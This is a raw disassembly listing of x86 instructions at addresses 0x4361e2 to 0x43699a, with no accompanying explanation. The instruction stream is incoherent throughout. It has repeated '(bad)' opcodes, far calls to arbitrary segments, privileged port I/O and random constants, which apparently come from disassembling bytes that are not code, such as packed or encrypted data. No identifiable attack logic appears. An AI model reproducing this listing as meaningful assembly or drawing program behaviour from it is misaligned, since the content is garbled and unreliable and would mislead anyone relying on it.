  4361e2:	mov    esi,0x9aca58d3
  4361e7:	aam    0x9d
  4361e9:	add    al,0xcf
  4361eb:	mov    edx,0xa64aa670
  4361f0:	into   
  4361f1:	mov    esi,0xc440414
  4361f6:	es imul esp,ebx,0x18
  4361fa:	call   0xc77d:0x20d07d96
  436201:	ds scas al,BYTE PTR es:[edi]
  436203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436204:	fild   WORD PTR [eax-0x74]
  436207:	test   BYTE PTR [edx],dl
  436209:	addr16 xor edx,esi
  43620c:	mov    dl,0x94
  43620e:	aam    0xc1
  436210:	dec    ecx
  436211:	mov    ds:0xbf25e06,al
  436216:	sbb    al,0xff
  436218:	ins    DWORD PTR es:[edi],dx
  436219:	adc    esp,eax
  43621b:	jg     0x43627c
  43621d:	pop    ebp
  43621e:	call   0x9235:0xe8d89c95
  436225:	mov    ds:0x588ca760,eax
  43622a:	jecxz  0x4361e8
  43622c:	push   ecx
  43622d:	in     eax,dx
  43622e:	pop    ss
  43622f:	push   es
  436230:	mov    bl,0x66
  436232:	retf   0xd467
  436235:	xchg   edx,eax
  436236:	ret    0x662f
  436239:	xchg   esp,eax
  43623a:	shl    BYTE PTR [edi-0x6b8e9788],cl
  436240:	rcl    BYTE PTR [eax-0x384dafab],cl
  436246:	mov    ch,BYTE PTR [edx+ebp*4+0x7b59f6de]
  43624d:	or     ebp,ebp
  43624f:	fs push edx
  436251:	add    eax,DWORD PTR [edi-0xb]
  436254:	out    0x82,eax
  436256:	call   0x3ac1:0xdb8defce
  43625d:	dec    esi
  43625e:	dec    edx
  43625f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436260:	ins    BYTE PTR es:[edi],dx
  436261:	fs ret 
  436263:	adc    al,0x33
  436265:	mov    ch,0x63
  436267:	js     0x43621b
  436269:	xchg   esp,eax
  43626a:	jb     0x4362e7
  43626c:	pop    esp
  43626d:	mov    eax,edx
  43626f:	data16 into 
  436271:	xor    DWORD PTR [edi+0x5d],ebp
  436274:	mov    dl,0x6e
  436276:	mov    ecx,0x6aa58422
  43627b:	loopne 0x43622f
  43627d:	dec    ebx
  43627e:	ins    BYTE PTR es:[edi],dx
  43627f:	dec    edx
  436280:	(bad)  
  436281:	mov    ds:0xb4c5219,al
  436286:	cli    
  436287:	test   DWORD PTR [ebx],esi
  436289:	repnz mov ebx,0x9ae1bc37
  43628f:	mov    BYTE PTR [ebx+0x1f2ed90f],dh
  436295:	fstp   st(5)
  436297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436298:	jp     0x43625f
  43629a:	mov    dl,0x66
  43629c:	rep lods al,BYTE PTR ds:[esi]
  43629e:	mov    WORD PTR ds:[edx-0x24d4e8e7],?
  4362a5:	in     eax,0x49
  4362a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4362a8:	inc    edx
  4362a9:	or     ebx,esi
  4362ab:	retf   0x8a66
  4362ae:	push   es
  4362af:	sbb    eax,0x49d9dec
  4362b4:	lahf   
  4362b5:	or     eax,0xfa5337c5
  4362ba:	add    DWORD PTR [eax-0x5bb500ba],0xb37e3729
  4362c4:	cdq    
  4362c5:	pop    es
  4362c6:	and    al,ch
  4362c8:	loop   0x43632d
  4362ca:	call   0x3490:0xe9cfd564
  4362d1:	mov    ah,0xc5
  4362d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4362d4:	ja     0x4362e2
  4362d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4362d7:	pop    ebp
  4362d8:	dec    ebx
  4362d9:	push   ds
  4362da:	(bad)  
  4362db:	and    ecx,ecx
  4362dd:	xor    DWORD PTR [ebp-0x25617b6c],eax
  4362e3:	jns    0x4362c4
  4362e5:	in     al,dx
  4362e6:	xor    cl,BYTE PTR [ebp+0x60fd1529]
  4362ec:	stos   BYTE PTR es:[edi],al
  4362ed:	mov    ah,cl
  4362ef:	or     BYTE PTR [ecx],bl
  4362f1:	xchg   edx,eax
  4362f2:	gs pop ebx
  4362f4:	mov    edi,0xb21beba1
  4362f9:	mov    ecx,0x5e10ee3c
  4362fe:	popf   
  4362ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436300:	adc    dl,BYTE PTR [ebx-0x2e]
  436303:	mov    edi,0x11c75ab3
  436308:	mov    ecx,esi
  43630a:	inc    esi
  43630b:	arpl   WORD PTR [edx+edx*8],sp
  43630e:	pop    edx
  43630f:	add    ebx,DWORD PTR [eax-0xe]
  436312:	mov    ebp,0xeb0b450e
  436317:	pop    edx
  436318:	(bad)  
  436319:	jg     0x43631f
  43631b:	inc    ebp
  43631c:	inc    eax
  43631d:	in     eax,dx
  43631e:	call   0x6adb:0x9cbdf170
  436325:	and    al,BYTE PTR [edx]
  436327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436328:	adc    eax,0xb9d1b0
  43632d:	sbb    DWORD PTR [edi],edi
  43632f:	jmp    0x436392
  436331:	jns    0x4362cd
  436333:	or     eax,0xf241ffd2
  436338:	in     al,dx
  436339:	or     ecx,ebp
  43633b:	test   eax,0x414c862b
  436340:	xchg   ebp,eax
  436341:	stos   BYTE PTR es:[edi],al
  436342:	call   0x710c:0xca0410b1
  436349:	inc    ecx
  43634a:	aas    
  43634b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43634c:	ins    DWORD PTR es:[edi],dx
  43634d:	ins    BYTE PTR es:[edi],dx
  43634e:	add    esp,ecx
  436350:	dec    edi
  436351:	jno    0x436343
  436353:	stos   BYTE PTR es:[edi],al
  436354:	mov    dh,0xc4
  436356:	es ja  0x4362f5
  436359:	or     eax,0x8ce08319
  43635e:	or     cl,BYTE PTR [ebx+0x5df2236e]
  436364:	xchg   edi,eax
  436365:	or     esp,DWORD PTR [ebx+0x598b2758]
  43636b:	stc    
  43636c:	mov    dh,0x13
  43636e:	mov    eax,ds:0x3e8b2bef
  436373:	and    DWORD PTR [edx],ecx
  436375:	inc    ebp
  436376:	xor    eax,0xe40c9d59
  43637b:	clc    
  43637c:	add    bh,BYTE PTR [ebx]
  43637e:	mov    ebp,0x98376eb7
  436383:	inc    eax
  436384:	mov    dl,0x60
  436386:	dec    ebx
  436387:	and    al,0x6f
  436389:	sbb    al,0x88
  43638b:	enter  0xb84,0xe1
  43638f:	push   0xffffffae
  436391:	mov    esi,0xdcc22571
  436396:	fwait
  436397:	test   eax,0x6f2a80b5
  43639c:	ins    BYTE PTR es:[edi],dx
  43639d:	pop    ecx
  43639e:	push   edx
  43639f:	ror    BYTE PTR [ecx-0x1d72b1ce],0xdd
  4363a6:	jns    0x43640e
  4363a8:	jl     0x436368
  4363aa:	int3   
  4363ab:	loopne 0x436423
  4363ad:	sti    
  4363ae:	sub    eax,DWORD PTR [eax]
  4363b0:	mov    esp,0x5d1e7200
  4363b5:	xchg   esi,eax
  4363b6:	fcmovbe st,st(1)
  4363b8:	icebp  
  4363b9:	test   eax,0xbfb32c2
  4363be:	or     ebx,DWORD PTR [edi+ecx*4]
  4363c1:	push   edi
  4363c2:	mov    ebx,0x9a94d15d
  4363c7:	pushf  
  4363c8:	fwait
  4363c9:	lock xor BYTE PTR [edi-0x58ade7fd],ch
  4363d0:	cmp    ah,BYTE PTR [esi+0x71ebbb13]
  4363d6:	and    ebx,DWORD PTR [edi-0x6566ecf6]
  4363dc:	mov    ebp,0x96388eed
  4363e1:	adc    DWORD PTR [eax],0xffffffaf
  4363e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4363e5:	or     esp,esi
  4363e7:	sub    eax,eax
  4363e9:	jno    0x4363f3
  4363eb:	sbb    eax,DWORD PTR [ecx-0x1ed4975]
  4363f1:	mov    edx,DWORD PTR [ebx+0x158b43cf]
  4363f7:	std    
  4363f8:	xor    ecx,DWORD PTR [eax+0x20f2a788]
  4363fe:	je     0x436440
  436400:	dec    esp
  436401:	pop    ecx
  436402:	xchg   edx,eax
  436403:	add    eax,0xd92a36b2
  436408:	add    dl,cl
  43640a:	mov    ds:0x870b9d07,al
  43640f:	push   edi
  436410:	pop    edx
  436411:	lahf   
  436412:	rcr    BYTE PTR [esi-0x49],cl
  436415:	into   
  436416:	mov    ah,0xf
  436418:	adc    DWORD PTR [esi+0x51579d98],edx
  43641e:	jne    0x436487
  436420:	fs adc al,0x2a
  436423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436424:	push   edx
  436425:	sub    edi,ebp
  436427:	call   0x525e:0xd4e537e
  43642e:	mov    BYTE PTR [ebp+0x5f770b74],0x67
  436435:	jecxz  0x436417
  436437:	push   ebp
  436438:	dec    eax
  436439:	js     0x4363f8
  43643b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43643c:	out    0xa,al
  43643e:	ror    ah,0x19
  436441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436442:	cmp    DWORD PTR [ebp-0x4e],ebp
  436445:	inc    edi
  436446:	fstp   DWORD PTR [esi]
  436448:	mov    esp,0xe311642d
  43644d:	or     ah,bh
  43644f:	and    esp,ecx
  436451:	xor    ecx,DWORD PTR [esi]
  436453:	div    DWORD PTR [edi+0x1c56fdd6]
  436459:	retf   0x5753
  43645c:	push   ebx
  43645d:	sub    eax,0xe3bcfe9b
  436462:	xor    cl,BYTE PTR [esi+0xd]
  436465:	aad    0x7e
  436467:	rcl    esi,1
  436469:	or     edx,DWORD PTR [ecx]
  43646b:	imul   ebp,DWORD PTR [edx-0x7165bc6f],0xe7959a0e
  436475:	fld    TBYTE PTR ds:0xc7e39b29
  43647b:	test   eax,0x93dad5f0
  436480:	xor    cl,ah
  436482:	fmulp  st(7),st
  436484:	sbb    al,0x89
  436486:	mov    es,WORD PTR [edx-0x59bfedc8]
  43648c:	push   eax
  43648d:	rol    BYTE PTR [eax+0x7],0xc8
  436491:	jb     0x4364dd
  436493:	dec    esi
  436494:	fmul   DWORD PTR [ebx]
  436496:	cs (bad) 
  436498:	std    
  436499:	stc    
  43649a:	jne    0x436457
  43649c:	sbb    DWORD PTR ds:0xd691c99a,0xffffff9b
  4364a3:	sbb    BYTE PTR [ecx+0x5ba770cd],ah
  4364a9:	fisub  DWORD PTR [edx+0x2c]
  4364ac:	push   0xb2573632
  4364b1:	lods   eax,DWORD PTR ds:[esi]
  4364b2:	(bad)  
  4364b3:	cmp    BYTE PTR [esi-0x6d3ff90f],ah
  4364b9:	ss ja  0x436454
  4364bc:	xor    bl,BYTE PTR [ebx-0x6f]
  4364bf:	pop    edi
  4364c0:	in     eax,dx
  4364c1:	out    dx,eax
  4364c2:	inc    ebx
  4364c3:	sub    eax,0x17aeb4b2
  4364c8:	sub    BYTE PTR [edi],ah
  4364ca:	push   cs
  4364cb:	in     eax,dx
  4364cc:	or     ax,WORD PTR [edi]
  4364cf:	retf   0x7f9b
  4364d2:	pop    esp
  4364d3:	repz js 0x436463
  4364d6:	in     al,0xf7
  4364d8:	mov    dl,0x8b
  4364da:	cmp    dl,bl
  4364dc:	ret    
  4364dd:	out    0x4f,eax
  4364df:	fnstcw WORD PTR [edi+0xb]
  4364e2:	or     al,0xaf
  4364e4:	and    eax,0xd4950526
  4364e9:	in     al,0x9a
  4364eb:	std    
  4364ec:	out    0x61,eax
  4364ee:	aaa    
  4364ef:	call   FWORD PTR [ecx+ebx*2+0x6009a760]
  4364f6:	jl     0x43654e
  4364f8:	mov    ds:0x42c9fb70,eax
  4364fd:	jnp    0x436577
  4364ff:	mov    ebx,0xe406bcb2
  436504:	xor    al,BYTE PTR [edi+0x27847de0]
  43650a:	mov    ebx,0x7a0b05c1
  43650f:	shl    DWORD PTR [ebp+0x69],cl
  436512:	out    dx,eax
  436513:	cmc    
  436514:	mov    dl,0x4c
  436516:	cwde   
  436517:	arpl   WORD PTR [esi],ax
  436519:	pop    esp
  43651a:	jnp    0x436532
  43651c:	sub    eax,0xb7a7bdef
  436521:	out    dx,eax
  436522:	int3   
  436523:	add    DWORD PTR [esi],ebx
  436525:	dec    edi
  436526:	test   eax,0x8fc1b0d7
  43652b:	cmp    dl,BYTE PTR [ebx]
  43652d:	retf   0xe79c
  436530:	rcl    DWORD PTR [ebx],0x6f
  436533:	mov    edx,0x981b461
  436538:	sbb    ecx,DWORD PTR [edx]
  43653a:	adc    eax,ebx
  43653c:	(bad)  
  43653d:	dec    edi
  43653e:	ds push ebx
  436540:	pop    ecx
  436541:	retf   0xea9a
  436544:	pop    ds
  436545:	pusha  
  436546:	popa   
  436547:	jno    0x436585
  436549:	push   esi
  43654a:	mov    bl,0xa7
  43654c:	bound  esi,QWORD PTR [ebx+0xf]
  43654f:	repnz add BYTE PTR gs:[eax],bh
  436553:	sub    BYTE PTR [edx],dl
  436555:	iret   
  436556:	sbb    al,0x5a
  436558:	mov    ch,0xf5
  43655a:	adc    DWORD PTR [ebp-0x33],ecx
  43655d:	fisttp DWORD PTR [edx+0x68]
  436560:	icebp  
  436561:	out    0x89,eax
  436563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436564:	pusha  
  436565:	inc    ebx
  436566:	xor    ch,BYTE PTR [edx-0x2a1faa0d]
  43656c:	mov    dh,BYTE PTR [ecx-0x3d505932]
  436572:	xor    DWORD PTR ds:0x7653e6a3,esp
  436578:	imul   esi,DWORD PTR [ebx+0x177fc76c],0x8f094da
  436582:	mov    al,ds:0x9a6c6a96
  436587:	and    eax,0x8f1b34ac
  43658c:	sub    BYTE PTR [ecx+0x15],al
  43658f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436590:	dec    ebx
  436591:	and    DWORD PTR [ebp-0x32],edi
  436594:	in     al,0xf8
  436596:	dec    ecx
  436597:	mov    esi,DWORD PTR [edx-0x3e505fc3]
  43659d:	pop    ebx
  43659e:	mov    DWORD PTR [edx],eax
  4365a0:	stos   DWORD PTR es:[edi],eax
  4365a1:	or     edi,eax
  4365a3:	ret    
  4365a4:	nop
  4365a5:	add    BYTE PTR [eax],ah
  4365a7:	out    0x53,al
  4365a9:	mov    ds:0xe50d29a,eax
  4365ae:	or     BYTE PTR [esi-0x5f54a1a5],0x25
  4365b5:	mov    edx,0x3c513b9b
  4365ba:	push   eax
  4365bb:	daa    
  4365bc:	inc    esi
  4365bd:	ins    BYTE PTR es:[edi],dx
  4365be:	cmp    eax,0xdeb7d27e
  4365c3:	pop    ecx
  4365c4:	out    dx,eax
  4365c5:	xor    bh,BYTE PTR [edi]
  4365c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4365c8:	outs   dx,BYTE PTR ds:[esi]
  4365c9:	aad    0x18
  4365cb:	xchg   ebp,eax
  4365cc:	not    DWORD PTR [ebp+0x7bbc3cd5]
  4365d2:	jb     0x436595
  4365d4:	mov    ds:0xc8c832ab,eax
  4365d9:	dec    ebp
  4365da:	test   BYTE PTR [edi-0x4f008328],ah
  4365e0:	jl     0x436565
  4365e2:	sbb    dh,BYTE PTR [edi-0x4e]
  4365e5:	(bad)  
  4365e6:	out    dx,eax
  4365e7:	push   ecx
  4365e8:	mov    bh,0xb1
  4365ea:	aam    0x7a
  4365ec:	test   DWORD PTR [edx],ecx
  4365ee:	pop    ds
  4365ef:	retf   0xe1a7
  4365f2:	das    
  4365f3:	inc    esi
  4365f4:	and    edi,DWORD PTR [ebx+0x57]
  4365f7:	pop    edi
  4365f8:	mov    dl,0x2f
  4365fa:	mov    edx,0x88795b7e
  4365ff:	and    bl,BYTE PTR [ecx+0xb]
  436602:	ret    0x3128
  436605:	pop    edi
  436606:	sbb    eax,0x66a11bbe
  43660b:	or     al,0xb2
  43660d:	adc    DWORD PTR [eax-0x22dd98ff],ebp
  436613:	je     0x43664c
  436615:	jg     0x43667f
  436617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436618:	nop
  436619:	rol    DWORD PTR [edx+0x581ae4ed],0x81
  436620:	mov    esp,0x71cd5bb0
  436625:	stos   DWORD PTR es:[edi],eax
  436626:	loopne 0x43669e
  436628:	adc    al,0xbe
  43662a:	mov    ds:0xae0b1953,al
  43662f:	jmp    0x4366ae
  436631:	ret    
  436632:	xor    dh,BYTE PTR [ebx]
  436634:	fs popa 
  436636:	xchg   esp,eax
  436637:	mov    ebp,0x8776591f
  43663c:	dec    esi
  43663d:	mov    ecx,DWORD PTR [edx]
  43663f:	aam    0xe3
  436641:	outs   dx,BYTE PTR ss:[esi]
  436643:	stos   DWORD PTR es:[edi],eax
  436644:	dec    esi
  436645:	or     eax,DWORD PTR [esi+0x2cf1d7d9]
  43664b:	mov    ds:0xc937ca2,eax
  436650:	fnstsw WORD PTR [esi-0x2a2cd827]
  436656:	cmp    dl,BYTE PTR [eax-0xa]
  436659:	or     edi,edi
  43665b:	lds    edi,FWORD PTR [ebx-0x50]
  43665e:	jmp    0x43663a
  436660:	sub    ah,BYTE PTR [esi-0x66]
  436663:	fwait
  436664:	rcr    BYTE PTR [ecx-0x47],0xea
  436668:	mov    ebx,eax
  43666a:	or     eax,0xfd505ea7
  43666f:	add    DWORD PTR [edi+edx*1-0x74],edi
  436673:	inc    esp
  436674:	mov    bl,0xff
  436676:	jmp    0x4366da
  436678:	xchg   DWORD PTR [eax+0x78],eax
  43667b:	es inc esi
  43667d:	daa    
  43667e:	jmp    0xda5a:0x954f9aa7
  436685:	aad    0xd7
  436687:	dec    edi
  436688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436689:	stos   BYTE PTR es:[edi],al
  43668a:	(bad)  
  43668b:	call   0x657dc442
  436690:	idiv   DWORD PTR [ecx]
  436692:	mov    ch,0xa7
  436694:	push   0xffffff8e
  436696:	jecxz  0x4366b3
  436698:	lahf   
  436699:	sub    eax,0xc4b35732
  43669e:	iret   
  43669f:	(bad)  
  4366a0:	mov    eax,ds:0xc32dc32b
  4366a5:	sub    al,0x52
  4366a7:	ins    BYTE PTR es:[edi],dx
  4366a8:	jo     0x4366b5
  4366aa:	add    eax,0x9e64533
  4366af:	pop    es
  4366b0:	lods   al,BYTE PTR ds:[esi]
  4366b1:	rcr    DWORD PTR [edx-0x4bc5958b],1
  4366b7:	div    bh
  4366b9:	loope  0x436651
  4366bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4366bc:	(bad)  
  4366bd:	outs   dx,BYTE PTR ds:[esi]
  4366be:	ret    
  4366bf:	ja     0x43671c
  4366c1:	rol    BYTE PTR [edx-0x43],cl
  4366c4:	cld    
  4366c5:	cwde   
  4366c6:	out    dx,al
  4366c7:	shl    DWORD PTR [ebx-0xaac2c02],1
  4366cd:	add    dh,bh
  4366cf:	(bad)  
  4366d0:	push   esi
  4366d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4366d2:	retf   
  4366d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4366d4:	fsubr  DWORD PTR ss:[esi+ebp*1+0x35]
  4366d9:	js     0x6ba1198d
  4366df:	add    ebp,ecx
  4366e1:	(bad)  
  4366e2:	jo     0x436719
  4366e4:	jbe    0x4366f1
  4366e6:	push   ebx
  4366e7:	aad    0x2e
  4366e9:	loopne 0x436677
  4366eb:	mov    eax,ds:0xf2fd6de6
  4366f0:	add    BYTE PTR [ebx],dh
  4366f2:	sub    edx,DWORD PTR [ebx+0x20]
  4366f5:	cmp    ebx,DWORD PTR [ebx]
  4366f7:	and    ecx,DWORD PTR [edx+0x77]
  4366fa:	ins    BYTE PTR es:[edi],dx
  4366fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4366fc:	mov    bl,al
  4366fe:	loope  0x4366e7
  436700:	mov    dl,0xe
  436702:	cmp    DWORD PTR [esp+eax*4-0x56],esi
  436706:	push   ebx
  436707:	pusha  
  436708:	loope  0x436716
  43670a:	push   esp
  43670b:	ficom  DWORD PTR [ecx-0x36]
  43670e:	xchg   DWORD PTR [edi],edx
  436710:	out    dx,eax
  436711:	dec    esp
  436712:	inc    esi
  436713:	jno    0x4366c2
  436715:	mov    ah,ah
  436717:	dec    eax
  436718:	repnz mov dl,0x40
  43671b:	pop    ebx
  43671c:	xchg   BYTE PTR [edx-0x42],ah
  43671f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436720:	out    dx,al
  436721:	js     0x4366e0
  436723:	shl    DWORD PTR [esp+ebx*4+0x5ab39873],1
  43672a:	mov    cl,0xaf
  43672c:	pop    esp
  43672d:	lods   al,BYTE PTR ds:[esi]
  43672e:	(bad)  
  43672f:	fwait
  436730:	jb     0x436713
  436732:	pop    ss
  436733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436734:	rcr    bh,0xab
  436737:	sub    edx,ebp
  436739:	jo     0x4367b6
  43673b:	xor    DWORD PTR [edx-0xf0ad3f6],esi
  436741:	cli    
  436742:	push   0xffffffbc
  436744:	and    DWORD PTR [edx],ecx
  436746:	outs   dx,BYTE PTR ds:[esi]
  436747:	xchg   edi,eax
  436748:	add    DWORD PTR [ebx-0x60],0xffffff92
  43674c:	xor    al,0xf7
  43674e:	(bad)  
  43674f:	dec    eax
  436751:	xchg   ecx,eax
  436752:	call   0xc95b:0x70ef252e
  436759:	cs in  eax,0xa7
  43675c:	mov    ebp,0x8dba29d
  436761:	test   DWORD PTR [ecx],eax
  436763:	aas    
  436764:	lods   al,BYTE PTR ds:[esi]
  436765:	fmul   QWORD PTR [ebx]
  436767:	lods   eax,DWORD PTR ds:[esi]
  436768:	xor    ch,BYTE PTR [edi]
  43676a:	imul   esi,ebx,0x4
  43676d:	enter  0x988d,0x2d
  436771:	or     ebp,esp
  436773:	(bad)  
  436774:	ror    BYTE PTR [ebx],1
  436776:	lahf   
  436777:	hlt    
  436778:	les    edx,FWORD PTR [esi]
  43677a:	jg     0x436709
  43677c:	inc    edx
  43677d:	(bad)  
  43677e:	call   0x1d07:0x39380c7
  436785:	popa   
  436786:	xchg   ebx,eax
  436787:	push   es
  436788:	xor    al,0x1d
  43678a:	arpl   bp,sp
  43678c:	inc    esi
  43678d:	dec    esp
  43678e:	ret    
  43678f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436790:	mov    bh,0x5e
  436792:	imul   esi,DWORD PTR [ebp+0x3d],0xffffff9d
  436796:	scas   al,BYTE PTR es:[edi]
  436797:	outs   dx,BYTE PTR ds:[esi]
  436798:	mov    dl,0x63
  43679a:	sbb    BYTE PTR ds:[esi+0x61],dh
  43679e:	data16 adc dl,BYTE PTR [ebx+0x30d03d0b]
  4367a5:	mov    cl,0x28
  4367a7:	mov    dh,0x83
  4367a9:	cmp    eax,0x6cb6d59a
  4367ae:	imul   esp,DWORD PTR [ecx-0x58342331],0xffffffe0
  4367b5:	inc    edx
  4367b6:	push   edi
  4367b7:	loope  0x43677c
  4367b9:	inc    eax
  4367ba:	test   al,0x9a
  4367bc:	mov    dl,0xa5
  4367be:	mov    ecx,0xa274ff07
  4367c3:	in     eax,0x14
  4367c5:	or     edx,DWORD PTR [esi]
  4367c7:	mov    ebx,0x1073cce4
  4367cc:	outs   dx,BYTE PTR ds:[esi]
  4367cd:	push   ds
  4367ce:	call   0xbe24:0x662b9f2e
  4367d5:	jae    0x4367cf
  4367d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4367d8:	test   edx,edx
  4367da:	sub    al,0x3
  4367dc:	icebp  
  4367dd:	sahf   
  4367de:	and    BYTE PTR [edx],ch
  4367e0:	lods   eax,DWORD PTR ds:[esi]
  4367e1:	adc    eax,0xdc7298a1
  4367e6:	xor    al,0x20
  4367e8:	cmp    eax,0xb79fcfcb
  4367ed:	jg     0x436809
  4367ef:	sub    DWORD PTR [esi-0x130ec32a],ebp
  4367f5:	lods   al,BYTE PTR ds:[esi]
  4367f6:	call   0x9d2d:0xae214798
  4367fd:	bound  ecx,QWORD PTR [ebp-0x59]
  436800:	dec    ecx
  436801:	jecxz  0x436863
  436803:	addr16 pop ds
  436805:	push   0x44b21012
  43680a:	test   DWORD PTR [edx-0x44],edi
  43680d:	in     eax,0x39
  43680f:	xchg   ecx,eax
  436810:	pop    edi
  436811:	or     edi,DWORD PTR [eax+0x28fcbfae]
  436817:	add    DWORD PTR [edx-0x4dda93cc],0xfffffff5
  43681e:	gs pop esi
  436820:	or     esi,DWORD PTR [ebp+0x17ea359f]
  436826:	rcl    DWORD PTR [esi+ebx*8],1
  436829:	retf   
  43682a:	xchg   ebx,eax
  43682b:	loopne 0x43688a
  43682d:	gs mov cl,0xe2
  436830:	scas   eax,DWORD PTR es:[edi]
  436831:	xor    DWORD PTR [ebp-0x28],ecx
  436834:	lods   al,BYTE PTR ds:[esi]
  436835:	jmp    0x64f712d4
  43683a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43683b:	test   al,0x92
  43683d:	add    eax,0x14aa04e4
  436842:	fistp  QWORD PTR [ebp+0x49c2cba1]
  436848:	push   edx
  436849:	push   0xc4410986
  43684e:	sbb    ah,BYTE PTR [eax+ebx*4]
  436851:	mov    ds:0xba25a4b,eax
  436856:	dec    esi
  436857:	and    BYTE PTR [esi-0x54],cl
  43685a:	ja     0x43686f
  43685c:	(bad)  
  43685e:	call   0x75d1:0x8fa03458
  436865:	fsub   QWORD PTR [edx]
  436867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436868:	and    DWORD PTR [eax-0x16],esp
  43686b:	frstor [ebx]
  43686d:	inc    esi
  43686e:	or     dl,BYTE PTR [eax-0x2d65ab92]
  436874:	imul   ebp,DWORD PTR [ecx+ebp*1+0x3fd1f4fb],0xffffffa7
  43687c:	push   esi
  43687d:	or     DWORD PTR [esi+ecx*8+0x3d],0xb275cc7a
  436885:	les    eax,FWORD PTR [ebx+edx*1]
  436888:	and    al,0x2
  43688a:	loop   0x4368ea
  43688c:	mov    edx,0x43a76fe3
  436891:	fisttp WORD PTR [ebx+0x9fb2025]
  436897:	imul   ebp,DWORD PTR [edi+0x324da32a],0xffffffcd
  43689e:	mov    cl,BYTE PTR [ebx-0x5a32e60c]
  4368a4:	cdq    
  4368a5:	fwait
  4368a6:	in     eax,0xc6
  4368a8:	mov    ch,ch
  4368aa:	pop    edx
  4368ab:	push   ebx
  4368ac:	mov    cl,0x49
  4368ae:	call   0x83b8:0x1f1ee91c
  4368b5:	shl    DWORD PTR cs:[eax+0x5529c0b8],1
  4368bc:	bound  edi,QWORD PTR [ebx-0x362edc9b]
  4368c2:	adc    bl,0x54
  4368c5:	push   es
  4368c6:	fdivr  QWORD PTR [edx-0x31]
  4368c9:	adc    eax,0x6d58c527
  4368ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4368cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4368d0:	test   DWORD PTR [ebp-0x7c],esi
  4368d3:	daa    
  4368d4:	aaa    
  4368d5:	sbb    al,cl
  4368d7:	mov    esp,0xad9a890a
  4368dc:	aad    0x80
  4368de:	pop    ebx
  4368df:	imul   DWORD PTR [esi+0x61]
  4368e2:	popf   
  4368e3:	sbb    BYTE PTR [eax-0xd490a4a],bl
  4368e9:	push   ebx
  4368ea:	(bad)  
  4368eb:	nop
  4368ec:	inc    ebx
  4368ed:	(bad)  
  4368ee:	outs   dx,DWORD PTR ds:[esi]
  4368ef:	les    edx,FWORD PTR [edx-0x1e580e80]
  4368f5:	cmp    DWORD PTR [ecx+0x415ab83a],edx
  4368fb:	aam    0xb9
  4368fd:	xor    esi,ebp
  4368ff:	push   edx
  436900:	add    eax,0xf5c2b60b
  436905:	call   0xa3de:0x36fca78e
  43690c:	nop
  43690d:	cwde   
  43690e:	cs push ds
  436910:	mov    cl,0xd0
  436912:	int3   
  436913:	jae    0x4368eb
  436915:	loop   0x436937
  436917:	dec    edi
  436918:	imul   edx,DWORD PTR [esi+eiz*8],0x51
  43691c:	inc    ebp
  43691d:	or     BYTE PTR [ebx-0x71],ah
  436920:	push   ebx
  436921:	cmp    al,0x81
  436923:	shl    BYTE PTR [edx],0x5d
  436926:	fwait
  436927:	into   
  436928:	mov    dl,0xca
  43692a:	cmc    
  43692b:	sub    cl,BYTE PTR [esi-0x68]
  43692e:	xchg   edi,eax
  43692f:	pop    ebp
  436930:	daa    
  436931:	or     esp,DWORD PTR [ecx+0x40]
  436934:	sub    DWORD PTR [esi-0x10],ecx
  436937:	push   eax
  436938:	into   
  436939:	or     BYTE PTR [ebp-0x2900bc5],dl
  43693f:	inc    edi
  436940:	and    eax,0xb814492e
  436945:	or     eax,DWORD PTR [eax-0x725d19bc]
  43694b:	std    
  43694c:	daa    
  43694d:	or     BYTE PTR [esi-0xb],bh
  436950:	mov    dl,0x70
  436952:	or     ebx,DWORD PTR [ebx+eiz*2+0x16893b22]
  436959:	or     ecx,ecx
  43695b:	gs xchg esi,eax
  43695d:	lock retf 
  43695f:	aaa    
  436960:	push   ds
  436961:	test   eax,0xe806429a
  436966:	repnz fcomi st,st(5)
  436969:	fild   QWORD PTR [esi-0x59]
  43696c:	cmp    edi,DWORD PTR [ebx-0x389eff2e]
  436972:	mov    cl,0x9f
  436974:	mov    dl,0x25
  436976:	lds    eax,FWORD PTR [edi+esi*1-0x5e]
  43697a:	fmul   st,st(1)
  43697c:	loope  0x436989
  43697e:	sub    BYTE PTR [esp+ebx*2-0x78],ah
  436982:	push   0x41
  436984:	pop    ecx
  436985:	in     al,dx
  436986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436987:	xor    ah,ch
  436989:	or     BYTE PTR [eax],al
  43698b:	aam    0x32
  43698d:	and    edi,ebp
  43698f:	sbb    dh,BYTE PTR [edx+0x1b]
  436992:	push   0x600bd687
  436997:	and    esi,esi
  436999:	aas    
  43699a:	daa    
